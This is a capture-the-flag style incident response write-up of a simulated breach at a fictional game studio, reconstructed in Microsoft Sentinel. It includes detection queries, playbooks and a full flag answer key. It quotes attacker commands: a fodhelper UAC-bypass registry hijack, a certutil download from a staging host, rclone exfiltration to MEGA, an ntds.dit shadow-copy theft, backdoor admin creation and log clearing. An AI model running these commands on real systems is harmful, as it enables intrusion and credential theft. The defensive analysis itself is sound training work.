# Incident Response Report: EmberForge Studios — Source Code Breach

---

<img width="553" height="90" alt="image" src="https://github.com/user-attachments/assets/0c9a9bf7-b68d-4c76-bf7b-1a8d4f0bcd2c" />


**Prepared By:** Chukwuebuka Okorie, Information Security Analyst

**Organisation:** Log(N) Pacific CyberRange

**Client:** EmberForge Studios

**Date of Report:** 7th April 2026

**Investigation Window:** 2026-01-30 21:00 UTC — 2026-01-31 00:00 UTC

**Platform:** Microsoft Sentinel (KQL) | Workspace: law-cyber-range | Table: EmberForgeX_CL

---

Disclaimer🚨⚠️🚨: _This report is based on a simulated breach investigation conducted on the Log(N) Pacific CyberRange. EmberForge Studios is a fictional organisation. All telemetry is from a controlled intrusion simulation._

## Executive Summary

On 30 January 2026, EmberForge Studios suffered a targeted breach that resulted in the theft of proprietary game source code, full domain compromise, and persistent backdoors planted across the environment. I investigated the incident using Microsoft Sentinel, working through Sysmon and Windows Security telemetry to reconstruct the full attack chain across three hosts.

What I found was a carefully planned attack. The attacker sent a malicious file disguised as a project review to a specific employee, Lisa Martin. From her workstation, they escalated privileges, moved laterally to a server and the Domain Controller, stole the contents of the game development repository, uploaded it to MEGA cloud storage, dumped every credential in the domain, created a backdoor admin account, and then tried to cover their tracks by clearing event logs.

This report walks through how I traced each phase of the attack, what I found, and what I'd recommend to prevent it from happening again.

---

## Hosts in Scope

| Hostname | Role | Primary User |
|----------|------|-------------|
| EC2AMAZ-B9GHHO6 | Workstation | EMBERFORGE\lmartin (Lisa Martin) |
| EC2AMAZ-16V3AU4 | Server | EMBERFORGE\jsmith |
| EC2AMAZ-EEU3IA2 | Domain Controller | EMBERFORGE\Administrator |

**Domain:** emberforge.local

---

## 1. How It Started — Initial Access

> **CISO:** *"How did they get in? I need to know if Lisa was targeted specifically or if this was opportunistic. Do we need to alert the rest of the team?"*

I started by tracing the earliest malicious activity on Lisa's workstation and working backwards to understand how the payload got there.

At **21:24:04**, I found 7-Zip extracting a downloaded archive into a folder in Lisa's profile:

```
"C:\Program Files\7-Zip\7zG.exe" x -o"C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\" -spe -an -ai#7zMap13315:120:7zEvent17197
```

**Flag (Q14):** `7zG.exe > C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review`

<img width="918" height="169" alt="image" src="https://github.com/user-attachments/assets/f13e8261-0a11-44e0-bd57-404b580b84b1" />

The archive contained a disk image file (like an ISO) which Windows mounted automatically as drive `D:`. This is significant because Windows normally tags downloaded files with something called Mark-of-the-Web, which triggers SmartScreen warnings when you try to open them. But files inside mounted disk images don't get that tag, so SmartScreen never fires. The attacker deliberately chose this format to bypass that protection.

**Flag (Q11):** `D:` — the malicious file was on a virtual drive, not a physical disk.

At **21:27:03**, Lisa opened the file from Explorer, which triggered the payload:

```
"C:\Windows\System32\rundll32.exe" D:\review.dll,StartW
```

`rundll32.exe` is a legitimate Windows utility used to run code from DLL files. The attacker abused it to load their malicious DLL. A file called `review.dll` sitting on a mounted drive and being loaded through `rundll32.exe` is not something you'd see in normal user activity.

**Flag (Q10):** `review.dll`
**Flag (Q12):** `lmartin` — patient zero.
**Flag (Q13):** `explorer.exe > rundll32.exe > review.dll`

Based on what I found, this was definitely targeted. The payload was named to look like a project review file, the archive was called `EmberForge_Review`, and the delivery format was specifically chosen to bypass SmartScreen. I'd recommend alerting the rest of the team as well though, because once the attacker gained domain-level access, all accounts became at risk.

---

## 2. What Ran on the Workstation — Execution and C2

> **CISO:** *"Now I need you to tell me how far they got. What ran on that workstation? What is it talking to?"*

Once the DLL was loaded, I traced what it dropped and where it called home.

The DLL dropped a persistent implant called `update.exe` into `C:\Users\Public\` — a folder any user can write to. The name was deliberately generic to blend in with legitimate Windows processes.

**Flag (Q15):** `C:\Users\Public\update.exe`
**Flag (Q16):** C2 domain — `cdn.cloud-endpoint.net`
**Flag (Q17):** Primary C2 IP — `104.21.30.237`

I also noticed an injection technique. At **21:32:42**, `notepad.exe` was spawned by the `rundll32.exe` process that loaded the DLL. A legitimate user would not launch Notepad from a DLL execution. What the attacker did was spawn Notepad as an innocent-looking process and inject malicious code into it, so their activity would blend into normal system behaviour.

**Flag (Q18):** `rundll32.exe > notepad.exe`

---

## 3. How They Elevated — Privilege Escalation

> **CISO:** *"Did they get admin access? If they dumped credentials, I need to know which accounts are compromised. Every compromised account is a password reset."*

The attacker used a well-known technique to get admin access without triggering a UAC prompt (the pop-up Windows shows when something tries to run as administrator).

The trick works by abusing `fodhelper.exe`, a Windows binary that is trusted to auto-elevate. The attacker modified a registry key to tell `fodhelper.exe` to run their implant instead of its normal function. There are two key registry changes I found:

At **21:38:33**, they set the command to run:
```
reg add HKCU\Software\Classes\ms-settings\shell\open\command /ve /t REG_SZ /d C:\Users\Public\update.exe /f
```

At **21:38:50**, they set the `DelegateExecute` value to empty, which is the piece that actually enables the bypass:
```
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /d "" /f
```

At **21:40:24**, they triggered it:
```
cmd.exe /c fodhelper.exe
```

This caused `update.exe` to run with full admin privileges, no UAC prompt.

**Flag (Q19):** `fodhelper.exe`
**Flag (Q20):** `DelegateExecute`

Once elevated, the attacker injected into the Windows Print Spooler service (`spoolsv.exe`), which runs as `NT AUTHORITY\SYSTEM` — the highest privilege level on a Windows machine. I confirmed this because many subsequent attacker commands had `spoolsv.exe` as their parent process.

**Flag (Q21):** `update.exe > spoolsv.exe (NT AUTHORITY\SYSTEM)`

The attacker also dumped credentials from LSASS. LSASS is the Windows process that handles authentication — it holds cached passwords and hashes in memory. By accessing its memory, the attacker could extract credentials for any user who had recently logged into the machine.

**Flag (Q22):** `update.exe`
**Flag (Q23):** `C:\Windows\System32\lsass.dmp`

Based on this, I'd recommend resetting the passwords for every account that was cached on this workstation. The credential dump means those accounts should all be considered compromised.

---

## 4. What They Learned — Discovery

> **CISO:** *"What do they know about our environment? If they mapped the domain, assume they know everything."*

After gaining elevated access, the attacker ran a series of reconnaissance commands. I found these all spawned by the `rundll32.exe` process under lmartin's context:

| Time | Command | Purpose |
|------|---------|---------|
| 21:33:59 | `hostname` | Identify the machine |
| 21:34:19 | `ipconfig /all` | Map the network |
| 21:34:32 | `net user /domain` | List all domain users **(Q24)** |
| 21:34:44 | `net group "Domain Admins" /domain` | Identify admin accounts **(Q25)** |
| 21:35:07 | `nltest /dclist:emberforge.local` | Find the Domain Controller **(Q26)** |
| 21:41:43 | `whoami /priv` | Check current privilege level |

They mapped the full domain — users, admins, and the DC location. I'd suggest assuming they know the complete layout of the environment.

---

## 5. How They Spread — Lateral Movement

> **CISO:** *"How many machines are compromised? I need to know the containment scope before I authorise any remediation."*

All three hosts were compromised. I traced the lateral movement from the workstation to the server, and then to the Domain Controller.

**Setting up for lateral movement:** At **22:51:36**, the attacker created a network share on the workstation so they could distribute tools to other machines:

**Flag (Q27):** `net share tools=C:\Users\Public /grant:everyone,full`

They also opened the firewall for SMB (file sharing) traffic:

**Flag (Q28):** Firewall rule name was `SMB`

**Flag (Q29):** All post-escalation commands ran through `spoolsv.exe` as SYSTEM.

**Moving to the server:** At **22:14:55**, the attacker copied their implant to the server:

**Flag (Q30):** `cmd.exe /c copy C:\Users\Public\update.exe \\10.1.57.66\C$\Users\Public\update.exe`

They also used `certutil.exe` — a legitimate Windows certificate tool — to download additional tools from their staging server. This is a common "Living Off the Land" technique where attackers use built-in system tools instead of bringing their own, to avoid detection.

**Flag (Q31):** `certutil.exe > http://sync.cloud-endpoint.net:8080/AnyDesk.exe`
**Flag (Q09):** All tool downloads came from `sync.cloud-endpoint.net`

<img width="925" height="160" alt="image" src="https://github.com/user-attachments/assets/e284b3be-9a27-44e4-a6e1-636454f0be5b" />

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "1"
| where CommandLine_s has "sync.cloud-endpoint.net"
| project UtcTime_s, Computer, CommandLine_s
```

**Remote execution on the server:** On EC2AMAZ-16V3AU4, I noticed a pattern where commands were wrapped in temporary batch files, executed through `services.exe`, and output was written to files with random suffixes. The first output file suffix I identified was:

**Flag (Q32):** `MzLblBFm`

**Flag (Q33):** The first actual command run on the server was `whoami` — the attacker checking their access level on the new host.

**Failed attempt:** I also found a failed lateral movement attempt by checking Windows Security EventCode 4625 (logon failures), which lives outside Sysmon data. The failed authentication used NTLM.

**Flag (Q34):** `NTLM`

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "4625"
| project UtcTime_s, Computer, AuthenticationPackageName_s, TargetUserName_s, Status_s
```

---

## 6. What Was Taken — Data Exfiltration

> **CISO:** *"I have a board meeting in 4 hours. Before I care about how they got in, I need to know what they took and where it went. Legal needs the scope for breach notification."*

The attacker stole the game development source code from `C:\GameDev` on the server.

At **23:11:28**, they compressed it using PowerShell's built-in `Compress-Archive` cmdlet — another Living Off the Land technique:

```
powershell.exe -c "Compress-Archive -Path C:\GameDev -DestinationPath C:\Users\Public\gamedev.zip"
```

**Flag (Q01):** `C:\GameDev`
**Flag (Q08):** `Compress-Archive`

<img width="913" height="212" alt="image" src="https://github.com/user-attachments/assets/2bc38b60-baa9-4bca-b701-f7e195b704a4" />

They then used `rclone.exe` — a legitimate cloud sync tool that threat actors commonly abuse — to upload the data to MEGA cloud storage. I found multiple execution attempts as the attacker troubleshot authentication:

<img width="934" height="173" alt="image" src="https://github.com/user-attachments/assets/2a50f2ad-98d7-4ac4-acb5-569cb914c4b4" />

**Flag (Q05):** `rclone.exe`
**Flag (Q02):** `MEGA`

To find the destination IP, I correlated rclone's process with its network connections using EventCode 3 (Sysmon network connection events):

```kql
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00) .. datetime(2026-01-31 00:00))
| where EventCode_s == "3"
| where Image_s has "rclone"
| project UtcTime_s, Computer, Image_s, DestinationIp_s, DestinationPort_s
```

**Flag (Q06):** `66.203.125.15` on port 443

<img width="920" height="214" alt="image" src="https://github.com/user-attachments/assets/78410424-e4a8-4a18-b116-0e71096eca49" />

The attacker also made a major OPSEC mistake. One of their rclone commands exposed credentials in plaintext:

```
rclone.exe copy C:\GameDev mega:exfil --mega-user jwilson.vhr@proton.me --mega-pass Summer2024! -v
```

**Flag (Q03):** `jwilson.vhr@proton.me`
**Flag (Q07):** `Summer2024!`

For Legal and breach notification, the scope is: all proprietary source code in `C:\GameDev` was exfiltrated to a MEGA account registered to `jwilson.vhr@proton.me`. I'd suggest coordinating with MEGA to freeze or seize that account.

---

## 7. Did They Own the Domain — Domain Compromise

> **CISO:** *"Tell me they did not reach the Domain Controller."*

Unfortunately, they did. I found the same remote execution pattern from the server being used against the DC (EC2AMAZ-EEU3IA2).

The attacker used a technique called Volume Shadow Copy to access `ntds.dit`, which is basically the database where Active Directory stores all usernames and password hashes for the entire domain. It's normally locked by the system so you can't just copy it, but shadow copies provide a snapshot that can be accessed.

At **23:35:04**, they created a shadow copy, then at **23:35:15** they copied out `ntds.dit`:

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\nyMdRNSp.tmp
```

**Flag (Q04):** `ntds.dit`
**Flag (Q35):** `whoami > vssadmin.exe`

They then cleaned up the shadow copy to hide their tracks.

The attacker also created a backdoor domain account:

```
net user svc_backup P@ssw0rd123! /add /domain
net group "Domain Admins" svc_backup /add /domain
```

**Flag (Q36):** `svc_backup`
**Flag (Q37):** `P@ssw0rd123!`
**Flag (Q38):** `Domain Admins`

I also noticed the existing Administrator password was exposed in plaintext when the attacker mapped network drives on both the server and DC:

```
net use Z: \\10.1.173.145\tools /user:EMBERFORGE\Administrator EmberForge2024!
```

**Flag (Q39):** `EmberForge2024!`

Since `ntds.dit` was extracted, every credential in the domain is compromised. I'd recommend a full password reset for all domain accounts, including resetting the `krbtgt` account twice to invalidate any Kerberos tickets the attacker may have forged.

---

## 8. Can They Come Back — Persistence

> **CISO:** *"If we rebuild these machines and reset every password, are we confident they cannot get back in?"*

I found three persistence mechanisms the attacker set up.

**Scheduled Tasks:** They created a task called `WindowsUpdate` on multiple hosts — deliberately named to look legitimate:

```
schtasks /create /tn WindowsUpdate /tr C:\Users\Public\update.exe /sc onstart /ru system
```

**Flag (Q40):** `WindowsUpdate`

**AnyDesk:** They installed AnyDesk, a remote desktop tool, silently on both the workstation and server. They also configured it for unattended access by writing a password hash directly into the config file:

**Flag (Q41):** `AnyDesk`
**Flag (Q42):** `C:\ProgramData\AnyDesk\system.conf`

**Timestamp Manipulation:** At **23:50:54**, they tried to change the last-modified timestamp on their implant to make it look like an old file:

```
powershell.exe -c "(Get-Item C:\Users\Public\update.exe).LastWriteTime = '01/15/2024 09:30:00'"
```

Rebuilding and resetting passwords alone won't be enough. I'd recommend also removing all `WindowsUpdate` scheduled tasks, uninstalling AnyDesk and deleting its config from all hosts, disabling the `svc_backup` account, and resetting the `krbtgt` account twice. Once all of that is done, I think we can be reasonably confident they can't get back in.

---

## 9. What They Hid — Anti-Forensics

> **CISO:** *"Are there gaps in our evidence? Did they try to cover their tracks?"*

Yes. The attacker used `wevtutil`, a built-in Windows utility, to clear event logs on the Domain Controller:

```
wevtutil cl Security
wevtutil cl System
```

**Flag (Q43):** `wevtutil`
**Flag (Q44):** `Security, System`

These are the two most important Windows log channels for forensic investigation. By clearing them, the attacker destroyed the native Windows audit trail on the DC.

The reason I was still able to investigate is that Sysmon logs were being forwarded externally to Sentinel via Splunk Universal Forwarder. The attacker couldn't reach those logs. Without Sysmon, I would have had very limited visibility into what happened on the DC.

---

## 10. Incident Response Playbooks

The following playbooks are based on what I observed during this investigation. Each one covers what should trigger a response and the steps I'd suggest taking.

---

### Playbook 1: Malicious ISO/DLL Delivery

**Triggers:** `rundll32.exe` loading a DLL from a removable or virtual drive. Disk image files (`.iso`, `.img`, `.vhd`) appearing in user download folders. Archive extraction followed shortly by DLL execution.

**Suggested Response:**
- Isolate the affected workstation and disable the user account.
- Block the delivery source (URL or email sender) at the gateway.
- Terminate all processes associated with the malicious DLL and any children.
- Delete the disk image, extracted contents, and any dropped payloads.
- Reimage the workstation from a clean baseline.
- Check whether other employees received similar deliveries.

---

### Playbook 2: UAC Bypass via Fodhelper

**Triggers:** Registry changes to `HKCU\Software\Classes\ms-settings\shell\open\command`. `DelegateExecute` being set to an empty string. `fodhelper.exe` spawning unexpected processes.

**Suggested Response:**
- Kill `fodhelper.exe` and any child processes.
- Delete the hijacked registry keys.
- Remove the binary that was registered as the handler.
- Review all activity after the escalation timestamp to assess scope.

---

### Playbook 3: Exfiltration via Dual-Use Cloud Tools

**Triggers:** `rclone.exe`, `megacmd`, or similar tools running from unexpected locations. Network connections from these tools to cloud storage IPs. Command lines containing cloud provider names with `copy` or `sync`.

**Suggested Response:**
- Kill the exfiltration process immediately.
- Block the destination IP at the firewall.
- Delete the tool, its config files, and any staged archives.
- Quantify the data loss from the command history.
- Notify legal for breach notification assessment.

---

### Playbook 4: Domain Compromise via ntds.dit

**Triggers:** `vssadmin create shadow` execution. Copy operations targeting `\Windows\NTDS\ntds.dit`. Unexpected domain account creation or group membership changes.

**Suggested Response:**
- Isolate the Domain Controller.
- Disable any newly created accounts.
- Reset `krbtgt` twice (with replication time between resets).
- Force password reset for all domain accounts.
- Delete shadow copies and temporary files containing the dump.
- Rebuild the DC from clean media if integrity is uncertain.

---

### Playbook 5: Log Clearing

**Triggers:** EventCode 1104 (Security log cleared) or 104 (System log cleared). `wevtutil cl` in process creation events.

**Suggested Response:**
- Cross-reference gaps against Sysmon, network logs, and external log copies.
- Document the evidence gap in the incident report.
- Implement external log forwarding to a write-once repository.

---

## 11. Capability Gap Analysis

I put this together to highlight where EmberForge could and couldn't detect what the attacker was doing. The key takeaway is that none of the attack phases were detected in real time. Everything in this report came from post-incident Sysmon analysis. If Sysmon hadn't been deployed and forwarded externally, the investigation would have been severely limited, especially since the attacker cleared the native Windows logs on the DC.

| Attack Phase | Technique (MITRE) | ID | What Happened | Recommended Improvement |
|---|---|---|---|---|
| Initial Access | Malicious File / MotW Bypass | T1204.002 / T1553.005 | Lisa opened a DLL from a mounted disk image. No alert. | Block ISO/VHD mounting via Group Policy. ASR rules to block execution from mounted images. Alert on `rundll32.exe` loading DLLs from non-standard drives. |
| Execution | Rundll32 Proxy Execution | T1218.011 | `rundll32.exe` loaded `review.dll` from `D:\`. No alert. | Sentinel rule for `rundll32.exe` with DLLs from removable/virtual drives. |
| Persistence | Scheduled Task | T1053.005 | Tasks named `WindowsUpdate` created on multiple hosts. No alert. | Alert on `schtasks /create` where task names mimic Windows services. |
| Priv Escalation | UAC Bypass via Fodhelper | T1548.002 | Registry hijack + `fodhelper.exe` abuse. No alert. | Alert on `ms-settings\shell\open\command` registry modifications. |
| Credential Access | LSASS Dump / NTDS Extraction | T1003.001 / T1003.003 | LSASS memory dumped, `ntds.dit` copied via VSS. No alert. | Deploy Credential Guard. Enable LSASS Protected Process Light. Alert on `vssadmin create shadow`. |
| Discovery | Domain Account Enumeration | T1087.002 | Rapid `net user`, `net group`, `nltest` commands. No alert. | Alert on multiple recon commands in quick succession from a single host. |
| Lateral Movement | SMB/Admin Shares + Service Exec | T1021.002 / T1569.002 | Implant copied via admin shares, remote execution via services. No alert. | Alert on `copy` to `C$` shares. Monitor `services.exe` spawning `cmd.exe` with batch patterns. |
| Exfiltration | Cloud Storage Exfil | T1567.002 | `rclone.exe` uploaded data to MEGA. No alert. | Block/alert on `rclone.exe`. Monitor outbound connections to cloud storage from non-browser processes. |
| Defence Evasion | Log Clearing / Timestomp | T1070.001 / T1070.006 | Security and System logs cleared. Timestamp modified. No alert. | Alert on `wevtutil cl`. Forward logs to external write-once storage. |
| Persistence | Remote Access Software | T1219 | AnyDesk installed silently with unattended access. No alert. | Application whitelisting to block unauthorised remote access tools. |

**What I'd prioritise:** Application whitelisting and ASR rules would have stopped the initial DLL execution and potentially prevented the entire chain. Real-time Sentinel analytics for the techniques above would have alerted the SOC during the attack rather than after. Credential Guard would have blocked the credential dumping that enabled lateral movement and domain compromise.

---

## 12. Recommendations

**Immediate:** Isolate all three hosts. Disable `svc_backup`. Reset all domain passwords including Administrator (`EmberForge2024!` was exposed). Reset `krbtgt` twice. Remove `WindowsUpdate` scheduled tasks. Uninstall AnyDesk. Block `sync.cloud-endpoint.net`, `cdn.cloud-endpoint.net`, `66.203.125.15`, `172.67.174.46`, and `104.21.30.237`.

**Short-Term:** Rebuild all three hosts from clean images. Audit GPOs and domain accounts for attacker modifications. Review firewall rules for attacker-created exceptions. Investigate how the malicious archive reached Lisa.

**Long-Term:** Application whitelisting to block unsigned DLLs. Block ISO/VHD at the email gateway. Deploy EDR with LSASS protection. Network segmentation between workstations, servers, and DCs. External log forwarding to write-once storage. Monitor for dual-use tools like rclone and AnyDesk.

---

## 13. Flag Summary

| Flag | Question | Answer |
|------|----------|--------|
| Q00 | Custom log table | `EmberForgeX_CL` |
| Q01 | Source directory | `C:\GameDev` |
| Q02 | Cloud provider | `MEGA` |
| Q03 | Attacker email | `jwilson.vhr@proton.me` |
| Q04 | System file via VSS | `ntds.dit` |
| Q05 | Exfil tool | `rclone.exe` |
| Q06 | Exfil destination IP | `66.203.125.15` |
| Q07 | Exposed password | `Summer2024!` |
| Q08 | Archive cmdlet | `Compress-Archive` |
| Q09 | Staging server | `sync.cloud-endpoint.net` |
| Q10 | Malicious file | `review.dll` |
| Q11 | Delivery drive | `D:` |
| Q12 | Compromised user | `lmartin` |
| Q13 | Execution chain | `explorer.exe > rundll32.exe > review.dll` |
| Q14 | Delivery unpacking | `7zG.exe > C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review` |
| Q15 | Dropped payload | `C:\Users\Public\update.exe` |
| Q16 | C2 domain | `cdn.cloud-endpoint.net` |
| Q17 | Primary C2 IP | `104.21.30.237` |
| Q18 | Injection chain | `rundll32.exe > notepad.exe` |
| Q19 | UAC bypass binary | `fodhelper.exe` |
| Q20 | Registry bypass enabler | `DelegateExecute` |
| Q21 | Stable injection | `update.exe > spoolsv.exe (NT AUTHORITY\SYSTEM)` |
| Q22 | Credential dump process | `update.exe` |
| Q23 | Dump location | `C:\Windows\System32\lsass.dmp` |
| Q24 | User enumeration | `net user /domain` |
| Q25 | Privilege enumeration | `net group "Domain Admins" /domain` |
| Q26 | Infrastructure mapping | `nltest /dclist:emberforge.local` |
| Q27 | Tool staging share | `net share tools=C:\Users\Public /grant:everyone,full` |
| Q28 | Firewall rule | `SMB` |
| Q29 | Post-escalation parent | `spoolsv.exe` |
| Q30 | Beacon distribution | `cmd.exe /c copy C:\Users\Public\update.exe \\10.1.57.66\C$\Users\Public\update.exe` |
| Q31 | LOLBin staging | `certutil.exe > http://sync.cloud-endpoint.net:8080/AnyDesk.exe` |
| Q32 | Remote execution evidence | `MzLblBFm` |
| Q33 | First command on server | `whoami` |
| Q34 | Failed lateral movement | `NTLM` |
| Q35 | DC arrival and extraction | `whoami > vssadmin.exe` |
| Q36 | Backdoor account | `svc_backup` |
| Q37 | Backdoor credentials | `P@ssw0rd123!` |
| Q38 | Privilege assignment | `Domain Admins` |
| Q39 | Exposed credential | `EmberForge2024!` |
| Q40 | Scheduled task | `WindowsUpdate` |
| Q41 | Remote access tool | `AnyDesk` |
| Q42 | Remote access config | `C:\ProgramData\AnyDesk\system.conf` |
| Q43 | Anti-forensics tool | `wevtutil` |
| Q44 | Cleared logs | `Security, System` |

---

*End of Report — Prepared by Chukwuebuka Okorie, Log(N) Pacific CyberRange*
